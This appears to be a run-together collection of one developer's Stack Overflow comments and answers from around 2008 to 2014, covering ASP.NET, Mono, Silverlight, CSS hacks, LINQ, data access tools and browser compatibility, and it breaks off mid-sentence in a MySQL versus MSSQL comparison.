Mono has support for Winforms and ASP.NET 2.0 and partial support for 3.x features, so you don't need to roll your own. I used Microsoft's JLCA and it really did work: http://weblogs.asp.net/jgalloway/archive/2007/01/24/identicons-ported-from-java-servlet-to-httphandler.aspx This is a duplicate of SO#33242http://stackoverflow.com/questions/33242/how-can-i-find-unused-images-and-css-styles-in-a-website Reopened. Sorry - I hadn't realized that you were asking the reverse of that other question. Interesting - I think this is the best plan. I'll be processing HTTP requests, so it's tough to give up on the HttpListener, but I think this is the best idea.Two links I've found so far that may help: http://is.gd/3wuXhttp://is.gd/3wv2 Matt, I wish you'd added that as an answer so I could have voted for you... Why (other than homework) would you want to do this without using any built-in functions? This is helpful, but I'm looking for a programmatic check. Hint: there's a list here, but who knows how up to date it is - http://ha.ckers.org/weird/crossdomain.html Yep - I've been going through them and noticing the same thing. Dan, I enabled wiki mode Yes, that's correct. Mono will run .NET EXE's without recompiling and without requiring .NET be installed. Additionally, Mono has a static linker which will allow you to build EXE's that will run on computers which don't have either Mono or .NET installed. I'm messing with something like Wordle (http://www.wordle.net/) for the MIX 10K challenge. I can't load the ASX file in Silverlight - it throws an exception. How can I get at the Attributes if I can't load it? You should post two questions on stack overflow - your questions are not related and you won't get good answers grouping them like this. Agree. I've used SourceGrid and it worked well for me. This has been added for Silverlight 3. w00t! Note - I'm not talking about web-scraping. Facebook has an API which allows for external integration - e.g. the Live Stream widget I referenced. David, that reference is very out of date - look at the the browser versions it lists. CSS Zoom is supported in all current major browsers except Firefox. And it's no more proprietary than any of the -moz- CSS extensions. You don't (shouldn't) need to recreate the app in MonoDevelop. Mono should be able to run DLL's compiled in Visual Studio. I'd look at that ComboBoxControl.SetWindowsTheme call - that's making the p/invoke call, which means it won't be supported in Mono. Can you remove it, or not use that control? Can you post your rewrite rule? Just post whatever's in the web.config:... Clarified the wording. Thanks for the reference. That's just not correct. I've tested the solution I listed below (zoom + -moz-transform properties), and it works on FF3.5, IE6+, Safari, and Opera. It scales images as well as text. You can scale pages in CSS. Note: I think the other solutions that have been proposed - such as em and % based scaling - are more "pure" but aren't necessarily practical on most web layouts unless you've built that way from scratch. Rex nailed it. CSS hacks are called hacks for a reason - they're unprofessional programming. Use conditional comments. http://blogs.msdn.com/ie/archive/2005/10/12/480242.aspx It's closed by the / at the end: Tried the other syntax, too. Right, you could name it "Monkey" if you wated. The {*yournamehere} route will match anything. That's why it's important to list it last, or it will prevent your other routes from matching. Updated code sample to . Still not executing. Some minor nits about your html: (1) this looks like a  to me, masquerading as a bunch of div's (2) you don't need classes assigned for the menu items, thats what descendant selectors are for: div#platformMenu div { padding: 0 12px; etc. } That's the problem - ASP.NET code inside a javascript reference won't be processed by ASP.NET on the server. Deleted my un-answer. Thanks for correcting me. Oh, right. I thought you were trying to get rid of the .first and .last classes, too. You don't need .first if you're targeting IE7+, you can use #platformMeu div:first-child for that. Network Solutions is still around? Didn't we laugh the off the internet like a decade ago? I'm assuming the hosting arrangements are out of your hands... Can you give more context of what you're doing? Are you dropping image files into an application and doing graphic manipulationon them? I'd try removing that call and test with a transparent image. If it's needed, you've got several options: 1. Leave the unsafe code. 2. Iterate through the pixels in managed code (slow but managed). 3. Write a ShaderEffect (very fast but some work http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/bb81d488-5b9b-4737-8b74-1476f843a717). 4. Figure out how to load the BitmapSource into an Image, which would let you use SetRemapTable. I'd ask them to document their security concerns. Gimp is definitely heavier than ImageMagick, and from what I read it's not going to perform as quickly, either. But from what I read of ImageMagick, I'm not sure it can create layered PSD's, just edit or flatten them. No, it requires .NET 3.5 SP1. I think the "WPF way" to do it in .NET 3.0 is to use a CustomBitmapEffect (http://msdn.microsoft.com/en-us/library/ms771475.aspx), but there may be a better way. Remus, good points. These aren't as big of a deal when you're running scripts on your own website Muhammad is asking. John, I'd already linked to that (see the link for Huffman encoding). The one thing to keep in mind is that Huffman works from standard character frequencies in the English language, so if your form data isn't English text it might not be very efficient. Sure, but as you say it is purely semantic. var is still strongly typed so there's no difference in how the code functions. I added the links for you. Not going to downvote, but I disagree with your wording. You don't need to learn about WPF, you need to learn XAML based UI development. It's an interesting question, but I think it's pretty academic. I'd just use an int (or a value converter) if possible. I deleted my answer because it's not answering the question you asked, so no point sucking up the downvotes. This looks great! I'll test tomorrow morning and mark as answer then. Thanks, this looks good. I'm going to stick with the c# approach since I'm more comfortable with it and it's easier (for me) to debug. You can configure which SQL database is used to store the session state: http://support.microsoft.com/kb/836680 I would recommend using a separate session database so you're not messing with your application database. There's more info on the setup here: http://idunno.org/articles/277.aspx Thanks, Jon. Typo on my part. The typo was in my application. I can't wait until the StackOverflow addin for Visual Studio comes out so you can fix my apps as I work. :-) Don't you need runat=server with the ~/ reference? Lazy = posting the question on StackOverflow. Lazy is good!I've done this kind of thing before and regretted it. HTML Agility Pack deals with weird encoding issues, malformed HTML, etc. If the HTML is under your control and you know it won't change, you can get by with a custom solution; otherwise, leverage what other people have done! @Charlie - Yes, I'm recommending HTML Agility Pack. The complaint was lack of tutorials; here's some sample code that makes for a good tutorial. I checked with Geoff Norton, one of the Mono developers. His answer:"Currently, no. Future, maybe. For more information, its not x86 specific at all, we can run on any arch, we just have to port to OSX runloops/browsers." I'm not going to eat all the downvotes for saying it, but I think the conventional wisdom of never checking in generated DLL's and EXE's is usually based on cargo cult "best practices" without any real backing. It's often useful and rarely harmful. I get the following error when I run that:Error 7 The type arguments for method 'System.Linq.Enumerable.SelectMany(System.Collections.Generic.IEnumerable, System.Func>)' cannot be inferred from the usage. Try specifying the type arguments explicitly. Agree, Marc, but I'm accepting Mehrdad's answer because I wanted to see how this would be done in LINQ. Voted for your answer, too. Thanks! Need to do Length-1 since arrays are zero-based When I tested, I got index out of range unless I used Length-1 Here's how to work around the SPAN issue - change$("#").click(function()to$("# span").click(function() Winforms, ASP.NET, WPF, ? To each his own - I think DIY data access is bad news. It's time consuming to do right, and most people don't. Then you're stuck maintaining it later, because you're the only one who cares about it. Links can perform a get request, and you could use JavaScript to build the URL. But, you're right - if you need form elements to be submitted, there's no real benefit to links. Removed options that don't work in Silverilght. This one should, as verified by @Dimebrain I don't need to filter duplicates in each list, I need a de-duped list of child items across all items in the collection. To keep with my analogy, it's fine if each Zoo has a Lion and a Tiger, but I need a function which will get me a list of all Animal types in all my Zoos. It could be, but I'd really like to learn the LINQ solution rather than just restating the problem every time I hit this. Appreciate the input, though! Sorry, my question wasn't clearly stated. I'm looking for a generic solution. I've updated the question statement. My error message: Error 15 The type arguments for method 'System.Linq.Enumerable.SelectMany(System.Collections.Generic.IEnumerable, System.Func>)' cannot be inferred from the usage. Try specifying the type arguments explicitly. Thanks, this worked great. I'm going to accept and will look at converting it to a non-extension method just to make sure I fully understand it. The main problem I had seems to be in declaring the Func param correctly. I disagree - you can use MVC views to provide REST based information to a Silverlight control, just as you would to Javascript / jQuery client-side components. Silverlight is self-contained, but since it can communicate both with your server and with the other HTML on the page (via DOM bridge), it can be as closely integrated with your site as you'd like. Your code didn't come through - can you fix it? I don't think this is a real solution right now unless you can require your users to run the newest versions of non-IE browsers. Yes, jQuery has a very advanced selector engine that handles CSS3+ and is backward compatible to IE6. Doh - good catch. Fixed. bill - I agree, hope I didn't sound argumentative. Can't wait for wide browser support of CSS3! Dupe - http://stackoverflow.com/questions/26147/is-it-possible-to-embed-gecko-or-webkit-in-a-c-net-win-form-just-like-a-webviewGreat question, though! I can't argue with that thorough test suite, @porneL. You tested two obsolete versions of IE, didn't mention which Firefox you tested... I tested in all current browsers. Try it. I'd love to be proven wrong! I haven't seen callbacks happen reliably in .NET 1.1, 2.0, or 3.5. Do you have something that's pinging the site keeping the site alive? Can you give more specifics on your code and hosting? Excellent, thanks for digging into this. I'm pretty sure this has improved since I dug through it in Reflector several years ago. Also, ASP.NET 4 includes additional enhancements for caching, some of which are listed here: http://www.asp.net/learn/whitepapers/aspnet40/ Great point, Luke! I updated the question text. Thanks. Why don't you want to run IIS? You can host a Silverlight application on any webserver, if it's the OS/licensing - Apache, etc. More about that here: http://weblogs.asp.net/scottgu/archive/2006/04/09/App_5F00_Offline.htm-and-working-around-the-_2200_IE-Friendly-Errors_2200_-feature.aspx Scalability and availability seem to have been pretty well thought through - see this whitepaper: http://msdn.microsoft.com/en-us/library/cc949109.aspx Oh, you're right. The references I posted by the people who created RIA Services must be wrong. Glad you figured out the real way to do it. Can you post how you got it to work and accept your answer? That way the next person that hits this problem will know how to solve it. Can you explain how the Google and Bing licenses prevent you from using them? Can you explain why Brad's tutorial was totally useless to you? That would help in recommending other resources. Yes, it's a hack - I only proposed it in case you were really stuck. However, I'd call a table with multiple PK's a hack, too. Java Sound API isn't implemented in Android, and it's not planned: http://code.google.com/p/android/issues/detail?id=60 I was trying not to do that for other reasons, but I agree it's the best answer if possible. Thanks - I think the edit to use on delete cascade if possible, otherwise manually delete cascading relationships sums this up well. I do there's an InvoiceLine.Product. Thanks. So what would be the cleanest way to return them? Thanks. I always forget that you can group on generated properties rather than ID fields. Thanks, that's even better! What database are you using? The parent overrides the child because ".parent a" is more specific than ".child". As Obalix indicated, you need to make your child selector more specific, and a.child will do that. Is your DisplayTemplate in /Views/Shared/DisplayTemplates? That's the first searched path, so it'll be resolved fastest if it's in that folder. @ilk - I started working at Microsoft in December 2009. I posted this answer in August 2008. I took a job at Microsoft because I like their developer products, not the reverse. Nuff said. Fair enough, but that's silly to ignore Microsoft databases based on Access. Access it is a desktop database and has nothing to do with SQL Server. You know StackOverflow runs on SQL Server, right? So did you end up sticking with the server-side check with EmulateIE7? How are you tracking the organization parameter on the client? Cookie, custom header, URL? I think this makese sence since you are already injecting your repository. Are you allowed to have more than one database? You shouldn't need to use a repository just to use two databases, although that's a good pattern to move to for other reasons. This shouldn't be necessary just to point the ASP.NET Membership at a different database. That's just a matter of changing the connection string in web.config, right? Thanks, appreciate the link! I messed with that a bit, but it didn't seem like it would allow setting specific control properties like that. Maybe I missed something. Does it show which line the exceptions occur on? Thanks - I'm talking about using it as the ASP.NET encoder. With 4.1 you don't have to explicitly call into it. The UTF-7 attacks are interesting, but you have to specify it as the charset now, so it's not too much of a threat in modern browers, right? Reference here: http://idunno.org/archive/2011/04/23/antixss-4-1-beta-1.aspx I accepted @blowdart's answer since he's the lead on AntiXSS and I had a separate e-mail thread going with him on this. I upvoted you as well. ASP.NET MVC supports Asynchronous Controllers (http://msdn.microsoft.com/en-us/library/ee728598.aspx) but I don't think they're appropriate for this fire-and-forget type task. Related: http://stackoverflow.com/questions/3994085/are-there-any-non-obvious-dangers-in-using-threads-in-asp-net This is really cool, but not what I was trying to do. I wanted to create a Silverlight path from some actual text - e.g. "This is my text". Geoff Norton linked to cEXWB (http://www.google.ca/codesearch/p?hl=en#Y0QumTMIokc/cEXWB.cs&q=OLECMDID_OPTICAL_ZOOM&sa=N&cd=17&ct=rc) which shows an example once you have an IOleCommandTarget. This is a step in the right direction, but I want to control the zoom of an external web browser control. In the main example, I want to control the zoom of the editor surface in Windows Live Writer. I didn't downvote. I didn't mark as answer since this doesn't address the problem - controlling zoom in an external IE browser control. I don't think sendkeys will work. I'll probably need to use ExecWB or SendMessage. RediredUrl should do exactly that - it should direct to the originally requested page. So if your ForumController had an [Authorize] attribute and the user browsed to /forum/456?theme=1, they'd be redirected to /Account/LogOn, after which they'd be redirected to forum/456?theme=1. Note that there's a question mark rather than an ampersand there. If you're writing your own account controller, I recommend at least referencing the AccountController that's included in the ASP.NET MVC 3 Internet project template. This has the "works on my machine" pledge ;-) The script block I listed is immediately after the calls to /Scripts/jquery.validate.js and /Scripts/jquery.validate.unobtrusive.js. I am using a new MVC 3 project with jQuery 1.5.1. I'll try to post the sample project so you can compare. @skybluecodefier I've personally seen several times where the build didn't actually work at precisely the time when there was a production emergency. The build should always work, but sometimes doesn't, and there's real cost to not having the binaries. What is the cost to actually having them available? I'm curious - what wasn't working? Was it a Javascript reference? Thanks! I'd like to add Zen Coding support to Visual Studio, preferably as a VSIX. Here's an overview: http://coding.smashingmagazine.com/2009/11/21/zen-coding-a-new-way-to-write-html-code/ - seems like maybe the IOleCommandTarget with IVsTextView would work? Zen Coding is written in JavaScript, thinking I could call into that using a .NET JavaScript impl like IronJs / Jurassic. Added some info - the main reason is that I want to be able to use libraries other people have written without modifying them. js2coffee brought it to mind, but I'd like to know for when I run across others. Thanks - I'm hoping there's a way to do this client side using feature detection and defining const if it's not supported. Server-side may be the only option, though. lonesomeday - Thanks, but that doesn't solve the problem of using other libraries without modifying them. @Amalgovinius Exactly what Rex M said - as software developers, our job is to write the best code *we* can in any given circumstances. This works for me on Windows / Visual Studio 2010 / .NET 4 too. http://codepaste.net/uby5qr As an aside, your view and controller naming is redundant. Your Category views are in a Category directory so you can just name them Create, Delete, and Manage. Your CategoryController sets the context for its controller actions, so they can be named Create, Delete, and Manage as well. By the way - don't actually use domain="String" - either set a valid domain or leave that attribute out. Can you give more information about your reference to the App_Code folder? What section is it in? Best if you can just include that snippet in your question so we can see. I'd either delete this question or answer it yourself and accept your own answer then, so it's not just hanging around unanswered. possible duplicate of [What is System.Web.Mvc.MvcHandler.ProcessAsyncRequest()?](http://stackoverflow.com/questions/8304357/what-is-system-web-mvc-mvchandler-processasyncrequest) Thanks for the update, Eric. Too bad that IE9 doesn't support WAV, as that's the one format that could be generated client-side and could be supported on all browsers (no format patent issues that I'm aware of). See some answers to a similar question here: http://stackoverflow.com/questions/4831489/missing-visual-studio-2010-toolbox-items-in-asp-net-website-or-web-application You can possibly compress resources or DLL's, at the cost of slower application startup. [See this article](http://www.ddj.com/windows/184406005) or use the [free open source .NETZ tool here](http://madebits.com/netz/index.php). I'd really recommend using IE conditional comments instead of CSS hacks / filters to support IE. It's supported, and it keeps your main CSS clean. Most of the CSS heavies are recommending that over using hacks now. Example: `   ` Try this: [http://www.wherecanibuyit.co.uk/ASP/full-text-search.html](http://www.wherecanibuyit.co.uk/ASP/full-text-search.html) If that doesn't work, I'd use Lucene. I think people are doing this kind of thing via Ajax when possible. Not only is it a lot simpler from a code perspective, it offers a better user experience. @AndreCalil Nope, I honestly don't know and am very curious. This could be dangerous from a security perspective unless you're encoding the parameters using something like AntiXSS. Otherwise a malicious user can send in Javascript, IFRAME, object tags, etc., which would be injected into HTML that's presented to a user. OpenID and OAuth are built into MVC 4 applications using the Intranet template. http://www.asp.net/vnext/overview/videos/oauth-in-the-default-aspnet-45-templatesI personally would strongly discourage rolling your own membership system for reasons mentioned here: http://weblogs.asp.net/jgalloway/archive/2012/05/04/asp-net-mvc-authentication-customizing-authentication-and-authorization-the-right-way.aspx @MikeCole I'm not certain - I'm still getting up to speed with SimpleMembership - but I'd start by either implementing WebMatrix.WebData.ExtendedMembershipProvider (rather than MembershipProvider) if you need SimpleMembership account management or doing as Pranav recommends and replacing the new AccountController with an an MVC 3 AccountController. Instead of text.IsNullOrEmpty() I think you need string.IsNullOrEmpty(text) Luckily the Ctrl+drag functionality is not the only way to create connection between the elements: A right click brings up a list of delegates/events for an interface element, and clicking and dragging the circle to the right of those events to the appropriate delegate objects allows me to link elements with Outlets, Events with Actions, delegates with responders etc. http://codingincircles.com/2010/01/developing-remotely/ Visual Studio 2012 includes MVC 4. If you're using 2010, I'd recommend using Web PI for most cases. You could make an MVC 4 site using an empty web application and NuGet packages, but you'd also need to fiddle with web.config, you wouldn't have full VS support for things like snippets, etc. Why would you assume ANX won't be developed further? You can view recent commits here: http://anxframework.codeplex.com/SourceControl/list/changesets Chrome bug report here: https://bugs.webkit.org/show_bug.cgi?id=99922 You need to state what version of ASP.NET MVC you're talking about. If you're on ASP.NET MVC 5, you'd do this via ASP.NET Identity. Is it possible to use ASP.NET MVC 5 instead of ASP.NET MVC 4? MVC 5 has an updated ASP.NET Identity system that's a lot more configurable than SimpleMembership. If you delete the certificate and aren't being prompted to recreate it, you can fix that by repairing IIS Express per this answer: https://stackoverflow.com/a/20048613/5Note that you only see the repair option in the Control Panel's Add / Remove, not the modern settings. Telerik has released a conversion utility here: https://github.com/telerik/razor-converter Take a look at the CHECKSUM command:SELECT CHECKSUM_AGG(BINARY_CHECKSUM(*)) FROM sample_table WITH (NOLOCK);That will return the same number each time it's run as long as the table contents haven't changed. See my post on this for more information:CHECKSUMHere's how I used it to rebuild cache dependencies when tables changed:ASP.NET 1.1 database cache dependency (without triggers) Brad's list is pretty good. I also listen to:Sparkling Client (Silverlight specific)Jon Udell's Perspectives seriesHerding Code (shameless plug for a podcast I put onwith Kevin Dente, Scott "lazycoder" Koon, and K. ScottAllen. We recently interviewed Jeff Atwood about Stack Overflow, discussing both how the site is designed and the technology behind it. I'd recommend SubSonic if your project works with the ActiveRecord view that the database is your model. You'll get one class per table and everything just magically works. You can of course tweak and override things, but if you (or your project) fundamentally disagree with the class-per-table approach, I'd look at NHibernate since it starts with the more complex (but more flexible) approach of mapping your domain model to your database.If you're using a relatively simple database that's under your control (as in, you can change columns without sending eight forms to a database division oversight review board), I'd recommend starting with SubSonic and moving to NHibernate if SubSonic doesn't meet your needs. I'm working on a website which will switch to a new style on a set date. The site's built in semantic HTML and CSS, so the change should just require a CSS reference change. I'm working with a designer who will need to be able to see how it's looking, as well as a client who will need to be able to review content updates in the current look as well as design progress on the new look.I'm planning to use a magic querystring value and / or a javascript link in the footer which writes out a cookie to select the new CSS page. We're working in ASP.NET 3.5. Any recommendations?I should mention that we're using IE Conditional Comments for IE8, 7, and 6 support. I may create a function that does a replacement:&lt;link href="Style/&lt;% GetCssRoot() %&gt;.css" rel="stylesheet" type="text/css" /&gt;&lt;!--[if lte IE 8]&gt; &lt;link type="text/css" href="Style/&lt;% GetCssRoot() %&gt;-ie8.css" rel="stylesheet" /&gt;&lt;![endif]--&gt;&lt;!--[if lte IE 7]&gt; &lt;link type="text/css" href="Style/&lt;% GetCssRoot() %&gt;-ie7.css" rel="stylesheet" /&gt;&lt;![endif]--&gt;&lt;!--[if lte IE 6]&gt; &lt;link type="text/css" href="Style/&lt;% GetCssRoot() %&gt;-ie6.css" rel="stylesheet" /&gt;&lt;![endif]--&gt; In the .NET world, I recommend the HTML Agility Pack. Not near as simple as some of the above options (like HTMLSQL), but it's very flexible. It lets you maniuplate poorly formed HTML as if it were well formed XML, so you can use XPATH or just itereate over nodes.http://www.codeplex.com/htmlagilitypack I like Envy Code R. If you have a small database and you want to version the entire thing, this batch script might help. It detaches, compresses, and checks a MSSQL database MDF file in to Subversion.If you mostly want to version your schema and just have a small amount of reference data, you can possibly use SubSonic Migrations to handle that. The benefit there is that you can easily migrate up or down to any specific version. Using semantic HTML design is one of those things where you don't know what you're missing unless you make a practice of it. I've worked on several sites where the site was restyled after the fact with little or no impact to the server-side code.Restyling sites is a very common request, something that I've noticed more now that I'm able to say "yes" to instead of try to talk my way out of.And, once you've learned to work with the page layout system, it's usually no harder than table based layout. To echo what Lance said - the SubSonic query language has a fluent interface which isn't as pretty as LINQ, but gives you some of the benefits (compile time checking, intellisense, etc.). If you can move to SQL Server 2008, you can take advantage of the FILESTREAM support which gives you the best of both - the files are stored in the filesystem, but the database integration is much better than just storing a filepath in a varchar field. Your query can return a standard .NET file stream, which makes the integration a lot simpler.Getting Started with FILESTREAM Storage I've been looking at the NTag project as well, which handles MP3/WMA/OGG. I don't know of a single library that handles audio and video files, so you might have to use a few. Looks like MediaInfo is read-only at this point, by the way: http://sourceforge.net/forum/message.php?msg_id=4241318&amp;abmode=1Very cool project, though. It's fun finding out about all this cool stuff here on SO. I've been using TypeFaster. It's not pretty, but one nice feature is that it can load lessons in different keyboard layouts, like Colemak (layout files here) or Dvorak. Take a look at this chapter Jeff Atwood and I wrote about performance optimizations for websites. We cover a lot of stuff, but there's a lot of stuff about database tracing and optimization:Speed Up Your Site: 8 ASP.NET Performance Tips I recommend the Hooked On LINQ wiki. They've got some great introductory info, as well as more in depth info and samples on all of the operators.I listed a lot of LINQ references in the show notes for Herding Code Episode 10 (on LINQ). One of my favorites is an MSDN Magazine article which explains how LINQ works from a framework perspective in a way which really helped me understand how it works. There's a pretty good comparison chart on MSDN.Website projects are simple, in that all files added to the project folders are automatically compiled and included, which was supposedly added to make it more palatable to classic ASP and PHP developers. Once benefit is that it includes build providers, which allow for certain actions to be associated with a filetype - that's how the first release of SubSonic would rebuild the data access layer when you added a .abp file to the site.Web Application Projects are a lot more flexible, though. For instance, all class libraries in a Website Project need to be in the App_Code folder, which is frustrating in a complex application. There are a lot of scenarios which just don't work for a Website Project.You can convert from one to another, although if you're unsure I'd recommend just starting with a Web Application. As others have said, there's a good list at www.asp.net/learn. I think the biggest ASP.NET specific changes are:Official ASP.NET AJAX integrationListView (much better than the GridView / DataView in that they let you write out clean HTML)Big improvements to the IDE for CSS / HTML editingJavascript debuggingNote that ASP.NET MVC is not released yet, and was definitely not included with ASP.NET 3.5. The best way to secure your password is to stop using one. Use a trusted connection:How To: Connect to SQL Server Using Windows Authentication in ASP.NET 2.0. Then you have nothing to hide - publish your web.config and source to the world, they still can't hit your database.If that won't work for you, use the built in configuration encryption system in ASP.NET. Remotesoft offers a linker - $1250 for a single developer license: http://www.remotesoft.com/linker/index.htmlIf your application will run on Mono (and Mono's Winform desktop support is pretty good now), you can package your app as a Mono bundle, which is a single executable. There are two options - the default includes the runtime but doesn't static link to it, the other staticly links you to the Mono runtime. The reason you might not want to static link is that it would put your application under the LGPL; bundles that aren't static linked (still just a single exe) don't have that requirement.http://www.mono-project.com/Mono:Runtime#Bundles I'd look at SubSonic with the build provider (Website Project) setup. That works great because it automatically regenerates the DAL objects every time you build your project, so if the database changes in a way that breaks your code, you get a build error.It worked well until the database schema got really complex and we were hitting the limits of the ActiveRecord pattern, but as long as the schema's not hugely complex it works pretty well. Once the schema stabilizes, you can switch so that you're only building the DAL when you want to. From what I've read, VS 2008 SP1 and Team Foundation Server SP1 packages are traditional service packs that require you to first install the original versions before you will be able to install the SP.Is there a way, supported or not, to slipstream the install? (edited to remove recommendation to use DependencyPropertyDescriptor, which is not available in Silverlight)PropertyDescriptor AddValueChanged Alternative As mentioned in the question, IEnumerable has a CopyToDataTable method:IEnumerable&lt;DataRow&gt; query = from order in orders.AsEnumerable() where order.Field&lt;DateTime&gt;("OrderDate") &gt; new DateTime(2001, 8, 1) select order;// Create a table from the query.DataTable boundTable = query.CopyToDataTable&lt;DataRow&gt;();Why won't that work for you? Have you looked at Waegis?"Waegis is an online web service that exposes an open API (Application Programming Interface). It gets incoming data through its API methods and applies a quick check and identifies spam and legitimate content on time. It then returns a result to client to specify if the content is spam or not." The profile provider uses the ASP.NET Build Provider system, which doesn't work with Web Application Projects. Adding a customized BuildProvider class to the Web.config file works in an ASP.NET Web site but does not work in an ASP.NET Web application project. In a Web application project, the code that is generated by the BuildProvider class cannot be included in the application.source: MSDN Build Provider documentation One of the goals of ASP.NET MVC is to give you control of your markup. However, there have always been choices with ASP.NET which would allow you to generate relatively clean HTML.For instance, ASP.NET has always offered a choice with validator controls. Do you value development speed over markup? Use validators. Value markup over development speed? Pick another validation mechanism. Your comments on validators are kind of contradictory there - it's possible to use ASP.NET and still make choices for markup purity over development speed.Also, with webforms, we've had the CSS Friendly Control Adapters for a few years which will modify the controls to render more semantic markup. ASP.NET 3.5 included the ListView, which makes it really easy to write repeater type controls which emit semantic HTML. We used ASP.NET webforms on the Microsoft PDC site and have kept the HTML pretty clean: http://microsoftpdc.com/Agenda/Speakers.aspx - the Viewstate could probably be disabled on most pages, although in reality it's only a few dozen bytes. You might want to look at generating random data for Fuzz Testing. That would give you a pretty much unlimited amount of test data, and you're more likely to hit edge cases.Maybe some more information on what kind of test data you want, what format, and for what types of applications?

It compiles PHP to .NET code. Here are some benchmarks which show that it can dramatically improve performance. Can you clarify what you mean by the "Windows lock-in" thing with Silverlight?

FileHelpers is well tested and handles all kinds of edge cases that you'll eventually have to deal with if you do it yourself. Take a look at what FileHelpers does and only write your own if you're absolutely sure that either (1) you will never need to handle the edge cases FileHelpers does, or (2) you love writing this kind of stuff and are going to be overjoyed when you have to parse stuff like this:1,"Bill","Smith","Supervisor", "No Comment"2 , 'Drake,' , 'O'Malley',"Janitor,Oops, I'm not quoted and I'm on a new line!

It takes a little setup, but the nice thing is that Scrapbook grabs a local copy of each page so it works offline or if the site goes away. MERGE is one of the new features in SQL Server 2008, by the way. Bug ListsWeb developers have already compiled some pretty comprehensive lists; I think it's better to compile a list of resources than to duplicate those lists.http://www.positioniseverything.net/http://www.richinstyle.com/bugs/table.htmlhttp://www.quirksmode.org/ (as mentioned by Kristopher Johnson)JavascriptI agree with Craig - it's best to program Javascript using a library that handles differences between browsers (as well as simplify things like namespacing, AJAX event handling, and context). Here's the jump to Craig's answer (on this page).CSS ResetsCSS Resets can really simplify web development. They override settings which vary slightly between browsers to give you a more common starting point. I like Yahoo's YUI Reset CSS. Separating features into projects is often a YAGNI architecture optimization. How often have you reused those separate projects, really? If it's not a frequent occurrence, you're complicating your development, build, deployment, and maintenance for theoretical reuse.I much prefer separating into folders (using appropriate namespaces) and refactoring to separate projects when you've got a real-life reuse use case. If you're looking for an Open Source project in C#, you should also take a look at CodePlex (see the project list filtered on C#). Here are a few of the larger C# open source projects I'm aware of (either worked with, used, or heard a lot of good reports) which are well run and would definitely welcome input:Subtext (weblog system)SubSonic (data access toolkit + lots more)MVC Contrib (additional goodness for ASP.NET MVC)AJAX Control Toolkit (Controls built on the ASP.NET AJAX framework)BlogEngine.NET (weblog system)DasBlog (weblog system)DotNetNuke (web portal system) is probably the largest .NET open source project, but it's in VB.NET.I think it's better to join in an established project than to start your own. Your contributions will be used by more people, and from the point of view of an employer I'd much rather hear that you contributed to a project I might have heard of instead of "I started yet another .NET weblog project". CSS Resets (like the YUI Reset CSS) are great for this kind of thing. They reset paddings, margins, and other display properties on a lot of HTML elements to minimize the display differences. It depends on your audience, and whether the cost (development, maintenance, opportunity cost of developing to a 7 year old lowest common denominator) is worth it to gain those IE6 viewers.Also worth asking - is the IE6 demographic likely to care about or use your site? I think a large amount of IE6 users don't care about new technology (duh) or are accessing the web from corporate networks which restrict browser installations. Maybe those viewers aren't worth the effort - only you can answer that.I was happy to see that Apple's Mobile Me site won't support IE6.  If you're working in Visual Studio 2008 / .NET 3.5, you probably shouldn't use either. Use the ListView - it gives you the features of the GridView combined with the styling flexibility of a repeater. I'm working on a site which needs to be able to support two or more looks, changable at runtime. I'd hoped to be able to handle the change with a CSS switch, but it looks like I'll need to use a different masterpage for each design.So, what's the best way to set the masterpage at runtime? Page.MasterPageFile can only be set in the Page.OnPreInit event. It looks like the solutions are to make all my pages inherit from a common base which handles the PreInit event, or to use an HttpModule which does that.Any advice? Have you compared with the SHA1CryptoServiceProvider.ComputeHash method? It takes a byte array and returns a SHA1 hash, and I believe it's pretty well optimized. I used it in an Identicon Handler that performed pretty well under load. Can you use LINQ? If so, you can just use the .Take() method and specify how many records you want (maybe as total - N). I like the explanation of Lambdas in this article: The Evolution Of LINQ And Its Impact On The Design Of C#. It made a lot of sense to me as it shows a real world for Lambdas and builds it out as a practical example.Their quick explanation: Lambdas are a way to treat code (functions) as data. See Scott Hanselman's post on using DotNetOpenID in ASP.NET. Andrew Arnott's blog is full of samples on using DotNetOpenID with ASP.NET, including ASP.NET MVC.I recently hooked up DotNetOpenID for the Subtext 2.0 release. It went really smoothly - the code samples included with the DotNetOpenID download are pretty helpful. The one thing I'd recommend is that you just use the library and avoid the ASP.NET control. It uses table based layout (hardcoded) and is pretty difficult to restyle. I'm pretty much writing my own HTML - I'm using the ListView and Masterpages, but not really using the controls much anymore. My ListView laughs at your silly old repeater, by the way.However, bloatware isn't necessarily a bad thing. If I needed a low volume intranet application built, I'd much rather pay a less experienced developer to drag and drop controls than for an HTML twiddler (like you or me) to craft each tag. There's definitely a place for the quick, simple approach. What's the cost of "bloatware" in that scenario, as long as the control based code is written in a maintainable fashion? Often wiring controls together requires less custom code, which means simple maintenance.The one place I have to disagree with you - pretty much regardless of the application - is in crafting your own paging queries. You may like to do that kind of thing, but there's absolutely no business value in it. There are several professional-grade DAL tools which will usually write more maintainable, faster queries than most developers. Even if you lovingly craft the perfect paging query, it won't keep up to date with changes to the schema unless you continue to throw hours after it. I think better use of those hours is to build a lightweight system and put those hours into monitoring and fixing specific bottlenecks, rather than immediately jumping to the "database assembly language" layer. It's of course a matter of style, but I agree with Dare: C# 3.0 Implicit Type Declarations: To var or not to var?. I think using var instead of an explicit type makes your code less readable.In the following code:var result = GetUserID();What is result? An int, a string, a GUID? Yes, it matters, and no, I shouldn't have to dig through the code to know. It's especially annoying in code samples.Jeff wrote a post on this, saying he favors var. But that guy's crazy!I'm seeing a pattern for stackoverflow success: dig up old CodingHorror posts and (Jeopardy style) phrase them in terms of a question. When I first saw this, I thought "Great question! Neat answer, danb!"After a little thought, I'm not so sure this is a good idea. It's a little like generating event handlers for all controls in an ASP.NET page, or generating CRUD procedures for all tables in a database. I think it's better to create them as needed for two reasons:Less clutter from empty style declarationsLess temptation to misuse (or underuse) CSS by writing everything at the class level rather than using descendant selectors like (#navigation ul li a). I'll take away the obvious one here: mic and webcam support. Other than that, if you ran the Silverlight team, what would your highest priority be for Silverlight v.Next?Disclaimer: If we get some good responses, I'll pass them along to folks I know on the Silverlight team.UPDATE: The best place to report Silverlight feature requests now is the UserVoice site: http://silverlight.uservoice.com/ Okay, fine, I'll throw another one out there: audio file support. I'd love to be able to generate WAV data on the client and immediately play it. As it is, Silverlight only plays WMV and MP3, neither of which is simple (legal?) to create without a per-client license. MySQL is more likely to have database corruption issues, and it doesn't fix them automatically when they happen. I've worked with MSSQL since version 6.5 and don't remember a database corruption issue taking the database offline. The few times I've worked with MySQL in a production environment, a database corruption issue took the entire database offline until we ran the magic "please fix my corrupted index" thing from the commandline.MSSQL's transaction and journaling system, 